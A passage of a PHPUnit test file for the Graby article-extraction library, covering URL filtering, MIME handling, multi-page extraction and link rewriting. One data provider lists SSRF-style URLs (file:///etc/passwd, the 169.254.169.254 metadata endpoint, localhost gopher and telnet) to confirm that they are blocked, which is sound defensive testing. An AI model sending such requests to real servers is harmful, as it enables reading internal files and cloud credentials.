<?php

namespace Tests\Graby;

use Graby\Graby;
use GuzzleHttp\Client;
use GuzzleHttp\Message\Response;
use GuzzleHttp\Stream\Stream;
use GuzzleHttp\Subscriber\Mock;
use Http\Mock\Client as HttpMockClient;
use Monolog\Handler\TestHandler;
use Monolog\Logger;
use Symfony\Bridge\PhpUnit\DnsMock;

class GrabyTest extends \PHPUnit_Framework_TestCase
{
    /**
     * A human IPv4 corresponding to example.com.
     */
    const AN_IPV4 = '93.184.216.34';

    public function testConstructDefault()
    {
        $graby = new Graby(['debug' => true]);

        $this->assertTrue($graby->getConfig('debug'));
    }

    /**
     * @expectedException \Exception
     * @expectedExceptionMessage No config found for key:
     */
    public function testGetBadConfig()
    {
        $graby = new Graby();

        $graby->getConfig('does_not_exists');
    }

    public function dataForConfigOverride()
    {
        return [
            ['http_client', ['http_client' => ['rewrite_url' => ['dummy.io' => ['/foo' => '/bar'], 'docs.google.com' => ['/foo' => '/bar']]]]],
        ];
    }

    /**
     * @dataProvider dataForConfigOverride
     */
    public function testConfigOverride($key, $config)
    {
        $graby = new Graby($config);

        $this->assertSame($config[$key], $graby->getConfig($key));
    }

    /**
     * Parsing method inspired from Twig_Test_IntegrationTestCase.
     */
    public function dataForFetchContent()
    {
        $tests = [];

        $directoryIterator = new \RecursiveDirectoryIterator(__DIR__ . '/fixtures/sites/');
        $iteratorIterator = new \RecursiveIteratorIterator($directoryIterator, \RecursiveIteratorIterator::LEAVES_ONLY);

        foreach ($iteratorIterator as $file) {
            if (!preg_match('/\.test$/', $file)) {
                continue;
            }

            $test = file_get_contents($file->getRealpath());

            preg_match('/-----URL-----\s*(.*?)\s*-----URL_EFFECTIVE-----\s*(.*?)\s*-----HEADER-----\s*(.*?)\s*-----LANGUAGE-----\s*(.*?)\s*-----AUTHOR-----\s*(.*?)\s*-----TITLE-----\s*(.*?)\s*-----SUMMARY-----\s*(.*?)\s*-----RAW_CONTENT-----\s*(.*?)\s*-----PARSED_CONTENT-----\s*(.*?)\s*-----PARSED_CONTENT_WITHOUT_TIDY-----\s*(.*)/sx', $test, $match);

            $tests[] = [
                $match[1], // url
                $match[2], // url effective
                $match[3], // header
                $match[4], // language
                $match[5], // author
                $match[6], // title
                $match[7], // summary
                $match[8], // raw content
                $match[9], // parsed content
                $match[10], // parsed content without tidy
            ];
        }

        return $tests;
    }

    /**
     * @dataProvider dataForFetchContent
     */
    public function testFetchContent($url, $urlEffective, $header, $language, $author, $title, $summary, $rawContent, $parsedContent, $parsedContentWithoutTidy)
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(200, ['Content-Type' => $header], $rawContent));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(200, ['Content-Type' => $header], $rawContent));

        $graby = new Graby([
            'xss_filter' => false,
            'extractor' => [
                'config_builder' => [
                    'site_config' => [
                        __DIR__ . '/fixtures/site_config',
                    ],
                ],
            ],
        ], $httpMockClient);

        $res = $graby->fetchContent($url);

        $this->assertCount(11, $res);

        if ($language) {
            $this->assertSame($language, $res['language']);
        } else {
            $this->assertEmpty($res['language']);
        }

        if ($author) {
            $this->assertSame([$author], $res['authors']);
        } else {
            $this->assertEmpty($res['authors']);
        }

        $this->assertSame($urlEffective, $res['url'], 'Same url');
        $this->assertSame($title, $res['title'], 'Same title');
        $this->assertSame($summary, $res['summary'], 'Same summary');

        if (function_exists('tidy_parse_string')) {
            $this->assertSame($parsedContent, $res['html'], 'Same html');
        } else {
            $this->assertSame($parsedContentWithoutTidy, $res['html'], 'Same html');
        }

        $this->assertContains('text/html', $res['headers']['content-type']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataForAllowed()
    {
        return [
            ['feed://wikipedia.org', 'http://wikipedia.org'],
            ['www.wikipedia.org', 'http://www.wikipedia.org'],
        ];
    }

    /**
     * @dataProvider dataForAllowed
     */
    public function testAllowedUrls($url, $urlChanged)
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(301, ['Location' => $urlChanged]));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(200));

        $graby = new Graby([
            'allowed_urls' => ['wikipedia.org', 'wikimedia.com'],
        ], $httpMockClient);

        $graby->fetchContent($url);
    }

    public function dataForBlocked()
    {
        return [
            ['feed://lexpress.fr'],
            ['www.t411.io'],
        ];
    }

    /**
     * @dataProvider dataForBlocked
     *
     * @expectedException \Exception
     * @expectedExceptionMessage is not allowed to be parsed.
     */
    public function testBlockedUrls($url)
    {
        $graby = new Graby([
            'blocked_urls' => ['t411.io', 'lexpress.fr'],
        ]);

        $graby->fetchContent($url);
    }

    public function dataForNotValid()
    {
        return [
            ['http://lexpress devant.fr'],
            ['http://user@:80'],
            ['http://cest^long.fr'],
        ];
    }

    /**
     * @dataProvider dataForNotValid
     *
     * @expectedException \Exception
     * @expectedExceptionMessage is not valid.
     */
    public function testNotValidUrls($url)
    {
        $graby = new Graby();
        $graby->fetchContent($url);
    }

    /**
     * @expectedException \Exception
     * @expectedExceptionMessage is not allowed to be parsed.
     */
    public function testBlockedUrlsAfterFetch()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(200));

        $graby = new Graby([
            'blocked_urls' => ['t411.io'],
        ], $httpMockClient);

        $graby->fetchContent('t411.io');
    }

    public function testMimeTypeActionLink()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(200, ['Content-Type' => 'image/jpeg']));

        $graby = new Graby(['xss_filter' => false], $httpMockClient);

        $res = $graby->fetchContent('http://example.com/my%20awesome%20image.jpg');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('Image', $res['title']);
        $this->assertSame('<a href="http://example.com/my%20awesome%20image.jpg"><img src="http://example.com/my%20awesome%20image.jpg" alt="Image" /></a>', $res['html']);
        $this->assertSame('http://example.com/my%20awesome%20image.jpg', $res['url']);
        $this->assertEmpty($res['summary']);
        $this->assertSame('image/jpeg', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @expectedException \Exception
     * @expectedExceptionMessage is blocked by mime action.
     */
    public function testMimeTypeActionExclude()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'application/x-msdownload']
        ));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'application/x-msdownload']
        ));

        $graby = new Graby([
            'content_type_exc' => [
               'application/x-msdownload' => ['action' => 'exclude', 'name' => 'we do not want virus'],
            ],
        ], $httpMockClient);

        $graby->fetchContent('http://example.com/virus.exe');

        $this->assertCount(2, $httpMockClient->getRequests());
        $this->assertEquals('HEAD', $httpMockClient->getRequests()[0]->getMethod());
        $this->assertEquals('GET', $httpMockClient->getRequests()[1]->getMethod());
    }

    public function dataForExtension()
    {
        return [
            ['http://example.com/test.jpg', 'image/jpeg', 'Image', '', '<a href="http://example.com/test.jpg"><img src="http://example.com/test.jpg" alt="Image" /></a>'],
        ];
    }

    /**
     * @dataProvider dataForExtension
     */
    public function testAssetExtension($url, $header, $title, $summary, $html)
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => $header]
        ));

        $graby = new Graby(['xss_filter' => false], $httpMockClient);

        $res = $graby->fetchContent($url);

        $this->assertCount(1, $httpMockClient->getRequests());
        $this->assertEquals('HEAD', $httpMockClient->getRequests()[0]->getMethod());
        $this->assertCount(12, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame($title, $res['title']);
        $this->assertSame($html, $res['html']);
        $this->assertSame($url, $res['url']);
        $this->assertSame($summary, $res['summary']);
        $this->assertSame($header, $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testAssetExtensionPDF()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'application/pdf'],
            file_get_contents(__DIR__ . '/fixtures/document1.pdf')
        ));

        $graby = new Graby([], $httpMockClient);

        $res = $graby->fetchContent('http://example.com/test.pdf');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('Document1', $res['title']);
        $this->assertContains('Document title', $res['html']);
        $this->assertContains('Morbi vulputate tincidunt ve nenatis.', $res['html']);
        $this->assertContains('http://example.com/test.pdf', $res['url']);
        $this->assertContains('Document title Calibri : Lorem ipsum dolor sit amet', $res['summary']);
        $this->assertSame('application/pdf', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testAssetExtensionZIP()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'application/zip']
        ));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'application/zip']
        ));

        $graby = new Graby([], $httpMockClient);

        $res = $graby->fetchContent('https://github.com/nathanaccidentally/Cydia-Repo-Template/archive/master.zip');

        $this->assertCount(2, $httpMockClient->getRequests());
        $this->assertEquals('HEAD', $httpMockClient->getRequests()[0]->getMethod());
        $this->assertEquals('GET', $httpMockClient->getRequests()[1]->getMethod());

        $this->assertCount(12, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('ZIP', $res['title']);
        $this->assertContains('<a href="https://github.com/nathanaccidentally/Cydia-Repo-Template/archive/master.zip">Download ZIP</a>', $res['html']);
        $this->assertSame('application/zip', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testAssetExtensionPDFWithArrayDetails()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'application/pdf'],
            file_get_contents(__DIR__ . '/fixtures/Good_Product_Manager_Bad_Product_Manager_KV.pdf')
        ));
        $graby = new Graby([], $httpMockClient);

        $res = $graby->fetchContent('http://example.com/test.pdf');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('2011-12-20T21:58:48+00:00', $res['date']);
        $this->assertSame(['David Baca'], $res['authors']);
        $this->assertSame('Microsoft Word - Good_Product_Manager_Bad_Product_Manager_KV.doc', $res['title']);
        $this->assertContains('Good Product Manager Bad Product Manager By Ben Horowitz and David Weiden', $res['html']);
        $this->assertContains('http://example.com/test.pdf', $res['url']);
        $this->assertContains('Good Product Manager Bad Product Manager By Ben Horowitz and David Weiden', $res['summary']);
        $this->assertSame('application/pdf', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testAssetExtensionTXT()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(200, ['Content-Type' => 'text/plain'], 'plain text :)'));

        $graby = new Graby([], $httpMockClient);

        $res = $graby->fetchContent('http://example.com/test.txt');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('Plain text', $res['title']);
        $this->assertSame('<pre>plain text :)</pre>', $res['html']);
        $this->assertSame('http://example.com/test.txt', $res['url']);
        $this->assertSame('plain text :)', $res['summary']);
        $this->assertSame('text/plain', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataForSinglePage()
    {
        return [
            'single_page_link will return a string (ie the text content of <a> node)' => ['singlepage1.com', 'http://singlepage1.com/printed view', 'http://moreintelligentlife.com/print/content'],
            'single_page_link will return the a node' => ['singlepage2.com', 'http://singlepage2.com/print/content', 'http://singlepage2.com/print/content'],
            'single_page_link will return the href from a node' => ['singlepage3.com', 'http://singlepage3.com/print/content', 'http://singlepage3.com/print/content'],
            'single_page_link will return nothing useful' => ['singlepage4.com', 'http://singlepage4.com', 'http://singlepage4.com/print/content'],
            'single_page_link will return the href from a node BUT the single page url will be the same' => ['singlepage3.com/print/content', 'http://singlepage3.com/print/content', 'http://singlepage3.com/print/content'],
        ];
    }

    /**
     * @group dns-sensitive
     * @dataProvider dataForSinglePage
     */
    public function testSinglePage($url, $expectedUrl, $singlePageUrl)
    {
        DnsMock::withMockedHosts([
            'singlepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
            'singlepage2.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
            'singlepage3.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
            'singlepage4.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
            'moreintelligentlife.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);

        $httpMockClient = new HttpMockClient();
        $response = new \GuzzleHttp\Psr7\Response(
            200,
            [
                'Content-Type' => 'text/html',
                'Content-Language' => 'en',
            ],
            <<<"HTML"
<html><h1 class="print-title">my title</h1><div class="print-submitted">my content</div><ul>
<li class="service-links-print">
    <a href="$singlePageUrl" class="service-links-print">printed view</a>
</li></ul></html>
HTML
        );
        $httpMockClient->addResponse($response);
        $httpMockClient->addResponse($response);

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://' . $url);

        $this->assertCount(11, $res);
        $this->assertSame('en', $res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertSame('my content', $res['html']);
        $this->assertSame($expectedUrl, $res['url']);
        $this->assertSame('my content', $res['summary']);
        $this->assertContains('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testSinglePageMimeAction()
    {
        DnsMock::withMockedHosts([
            'singlepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);

        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h1 class="print-title">my title</h1><div class="print-submitted">my content</div><ul><li class="service-links-print"><a href="http://moreintelligentlife.com/print/content" class="service-links-print">printed view</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'image/jpeg'],
            '<html><h1 class="print-title">my title</h1><div class="print-submitted">my content</div><ul><li class="service-links-print"><a href="http://moreintelligentlife.com/print/content" class="service-links-print">printed view</a></li></ul></html>'
        ));

        $graby = new Graby(['xss_filter' => false, 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://singlepage1.com/data.jpg');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('Image', $res['title']);
        $this->assertSame('<a href="http://singlepage1.com/data.jpg"><img src="http://singlepage1.com/data.jpg" alt="Image" /></a>', $res['html']);
        $this->assertSame('http://singlepage1.com/data.jpg', $res['url']);
        $this->assertSame('', $res['summary']);
        $this->assertSame('image/jpeg', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageOk()
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div></html>'
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertSame('my content<div class="story">my content</div>', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content my content', $res['summary']);
        $this->assertContains('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageMimeAction()
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com/data.pdf">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'application/pdf'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div></html>'
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertContains('This article appears to continue on subsequent pages which we could not extract', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content This article appears to continue on subsequent pages which we could not extract', $res['summary']);
        $this->assertSame('application/pdf', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageExtractFailed()
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="multiplepage1.com">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            ''
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertContains('This article appears to continue on subsequent pages which we could not extract', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content This article appears to continue on subsequent pages which we could not extract', $res['summary']);
        $this->assertContains('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageBadAbsoluteUrl()
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="/:/">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div></html>'
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertContains('This article appears to continue on subsequent pages which we could not extract', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content This article appears to continue on subsequent pages which we could not extract', $res['summary']);
        $this->assertContains('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    /**
     * @group dns-sensitive
     */
    public function testMultiplePageSameUrl()
    {
        DnsMock::withMockedHosts([
            'multiplepage1.com' => [['type' => 'A', 'ip' => self::AN_IPV4]],
        ]);
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="http://multiplepage1.com">next page</a></li></ul></html>'
        ));
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<html><h2 class="primary">my title</h2><div class="story">my content</div><ul><li class="next"><a href="http://multiplepage1.com">next page</a></li></ul></html>'
        ));

        $graby = new Graby(['content_links' => 'footnotes', 'extractor' => ['config_builder' => [
            'site_config' => [__DIR__ . '/fixtures/site_config'],
        ]]], $httpMockClient);

        $res = $graby->fetchContent('http://multiplepage1.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('my title', $res['title']);
        $this->assertContains('This article appears to continue on subsequent pages which we could not extract', $res['html']);
        $this->assertSame('http://multiplepage1.com', $res['url']);
        $this->assertSame('my content This article appears to continue on subsequent pages which we could not extract', $res['summary']);
        $this->assertContains('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataForExcerpt()
    {
        return [
            ['hello you are fine', 35, null, 'hello you are fine'],
            ['hello you are fine ok ?', 14, null, 'hello you are fine'],
            // breakpoint in on the last word, won't add separator
            ['hello you are fine', 16, '...', 'hello you are fine'],
            ['hello "you" are fine', 15, '...', 'hello "you" are...'],
            ['hello <p>you</p> are fine', 13, '...', 'hello you are...'],
            ["hello you\n are fine", 13, '...', 'hello you are...'],
            [chr(0xc2) . chr(0xa0) . 'hello you are fine', 13, '...', 'hello you are...'],
            ['hello you are fine' . chr(0xc2) . chr(0xa0), 13, '...', 'hello you are...'],
        ];
    }

    /**
     * @dataProvider dataForExcerpt
     */
    public function testGetExcerpt($text, $length, $separator, $expectedResult)
    {
        $graby = new Graby();

        $reflection = new \ReflectionClass(get_class($graby));
        $method = $reflection->getMethod('getExcerpt');
        $method->setAccessible(true);

        $res = $method->invokeArgs($graby, [$text, $length, $separator]);

        $this->assertSame($expectedResult, $res);
    }

    public function dataForMakeAbsoluteStr()
    {
        return [
            ['example.org', '/test', false],
            ['http://example.org', '/test', 'http://example.org/test'],
            ['http://example.org', '', false],
            ['http://example.org//test', 'super', 'http://example.org/super'],
            ['http://example.org//test', 'http://sample.com', 'http://sample.com'],
        ];
    }

    /**
     * @dataProvider dataForMakeAbsoluteStr
     */
    public function testMakeAbsoluteStr($base, $url, $expectedResult)
    {
        $graby = new Graby();

        $reflection = new \ReflectionClass(get_class($graby));
        $method = $reflection->getMethod('makeAbsoluteStr');
        $method->setAccessible(true);

        $res = $method->invokeArgs($graby, [$base, $url]);

        $this->assertSame($expectedResult, $res);
    }

    public function dataForMakeAbsoluteAttr()
    {
        return [
            ['http://example.org', '<a href="/lol">test</a>', 'href', 'href', 'http://example.org/lol'],
            ['http://example.org', '<img src="/lol.jpg">test</img>', 'src', 'src', 'http://example.org/lol.jpg'],
            ['http://example.org', '<img src=" /path/to/image.jpg" />', 'src', 'src', 'http://example.org/path/to/image.jpg'],
            ['http://example.org', '<a href="/lol">test</a>', 'src', 'src', ''],
            ['http://example.org', '<iframe src="/lol" />', 'src', 'src', 'http://example.org/lol'],
            ['http://example.org', '<a href="#fn-ref-23">1</a>', 'href', 'href', '#fn-ref-23'],
        ];
    }

    /**
     * @dataProvider dataForMakeAbsoluteAttr
     */
    public function testMakeAbsoluteAttr($base, $string, $attr, $expectedAttr, $expectedResult)
    {
        $graby = new Graby();

        $doc = new \DomDocument();
        $doc->loadXML($string);

        $e = $doc->firstChild;

        $reflection = new \ReflectionClass(get_class($graby));
        $method = $reflection->getMethod('makeAbsoluteAttr');
        $method->setAccessible(true);

        $method->invokeArgs($graby, [$base, $e, $attr]);

        $this->assertSame($expectedResult, $e->getAttribute($expectedAttr));
    }

    public function dataForMakeAbsolute()
    {
        return [
            ['http://example.org', '<a href="/lol">test</a>', 'href', 'http://example.org/lol'],
            ['http://example.org', '<img src="/lol.jpg">test</img>', 'src', 'http://example.org/lol.jpg'],
            ['http://example.org', '<img src="//domain.com/lol.jpg">test</img>', 'src', 'http://domain.com/lol.jpg'],
            ['http://example.org', '<img src=" /path/to/image.jpg" />', 'src', 'http://example.org/path/to/image.jpg'],
            ['http://example.org', '<a href="/lol">test</a>', 'src', ''],
        ];
    }

    /**
     * @dataProvider dataForMakeAbsolute
     */
    public function testMakeAbsolute($base, $string, $expectedAttr, $expectedResult)
    {
        $graby = new Graby();

        $doc = new \DomDocument();
        $doc->loadXML($string);

        $e = $doc->firstChild;

        $reflection = new \ReflectionClass(get_class($graby));
        $method = $reflection->getMethod('makeAbsolute');
        $method->setAccessible(true);

        $method->invokeArgs($graby, [$base, $e]);

        $this->assertSame($expectedResult, $e->getAttribute($expectedAttr));
    }

    /**
     * Test on nested element: image inside a link.
     */
    public function testMakeAbsoluteMultiple()
    {
        $graby = new Graby();

        $doc = new \DomDocument();
        $doc->loadXML('<a href="/lol"><img src=" /path/to/image.jpg" /></a>');

        $e = $doc->firstChild;

        $reflection = new \ReflectionClass(get_class($graby));
        $method = $reflection->getMethod('makeAbsolute');
        $method->setAccessible(true);

        $method->invokeArgs($graby, ['http://example.org', $e]);

        $this->assertSame('http://example.org/lol', $e->getAttribute('href'));
        $this->assertSame('http://example.org/path/to/image.jpg', $e->firstChild->getAttribute('src'));
    }

    public function testContentLinksRemove()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(
            200,
            ['Content-Type' => 'text/html'],
            '<article><p>' . str_repeat('This is an awesome text with some links, here there are the awesome', 7) . ' <a href="#links">links :)</a></p></article>'
        ));

        $graby = new Graby(['content_links' => 'remove'], $httpMockClient);

        $res = $graby->fetchContent('http://example.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('No title found', $res['title']);
        $this->assertContains('<p>' . str_repeat('This is an awesome text with some links, here there are the awesome', 7) . ' links :)</p>', $res['html']);
        $this->assertSame('http://example.com', $res['url']);
        $this->assertSame('This is an awesome text with some links, here there are the awesomeThis is an awesome text with some links, here there are the awesomeThis is an awesome text with some links, here there are the awesomeThis is an awesome text with some links, here there &hellip;', $res['summary']);
        $this->assertContains('text/html', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function testMimeActionNotDefined()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(200, ['Content-Type' => 'application/pdf']));

        $graby = new Graby(['content_type_exc' => ['application/pdf' => ['action' => 'delete', 'name' => 'PDF']]], $httpMockClient);

        $res = $graby->fetchContent('example.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('No title found', $res['title']);
        $this->assertSame('[unable to retrieve full-text content]', $res['html']);
        $this->assertSame('http://example.com', $res['url']);
        $this->assertSame('[unable to retrieve full-text content]', $res['summary']);
        $this->assertSame('application/pdf', $res['headers']['content-type']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataForSafeCurl()
    {
        return [
            ['http://0.0.0.0:123'],
            ['http://127.0.0.1/server-status'],
            ['file:///etc/passwd'],
            ['ssh://localhost'],
            ['gopher://localhost'],
            ['telnet://localhost:25'],
            ['http://169.254.169.254/latest/meta-data/'],
            ['ftp://myhost.com'],
        ];
    }

    /**
     * @dataProvider dataForSafeCurl
     */
    public function testBlockedUrlBySafeCurl($url)
    {
        $graby = new Graby();
        $res = $graby->fetchContent($url);

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('No title found', $res['title']);
        $this->assertSame('[unable to retrieve full-text content]', $res['html']);
        $this->assertSame('[unable to retrieve full-text content]', $res['summary']);
        $this->assertEmpty($res['headers']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
        $this->assertSame(500, $res['status']);
    }

    public function testErrorMessages()
    {
        $httpMockClient = new HttpMockClient();
        $httpMockClient->addResponse(new \GuzzleHttp\Psr7\Response(200, [], 'yay'));

        $graby = new Graby([
            'error_message' => 'Nothing found, hu?',
            'error_message_title' => 'No title detected',
        ], $httpMockClient);

        $res = $graby->fetchContent('example.com');

        $this->assertCount(11, $res);
        $this->assertEmpty($res['language']);
        $this->assertSame('No title detected', $res['title']);
        $this->assertSame('Nothing found, hu?', $res['html']);
        $this->assertSame('http://example.com', $res['url']);
        $this->assertSame('Nothing found, hu?', $res['summary']);
        $this->assertEmpty($res['headers']);
        $this->assertEmpty($res['image']);
        $this->assertFalse($res['native_ad']);
    }

    public function dataWithAccent()
    {
        return [
            'host with accent' => ['http://pérotin.com/post/2009/06/09/SAV-Free-un-sketch-kafkaien', 'http://xn--protin-bva.com/post/2009/06/09/SAV-Free-un-sketch-kafkaien'],
